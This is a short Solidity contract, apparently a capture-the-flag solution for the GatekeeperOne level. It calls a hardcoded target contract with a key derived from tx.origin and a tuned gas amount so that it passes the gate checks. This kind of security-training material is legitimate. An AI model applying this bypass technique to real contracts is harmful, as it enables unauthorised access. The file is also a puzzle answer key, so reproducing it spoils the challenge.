// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

interface IGatekeeperOne {
    function enter(bytes8) external returns (bool);
}

contract GatekeeperOneHack {
    IGatekeeperOne public gatekeeperOne = IGatekeeperOne(0x4FB571078FCAa45fb611CDEd651961010a9A24bA);

    function enter() public {
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        gatekeeperOne.enter{gas: 41209}(gateKey);
    }
}
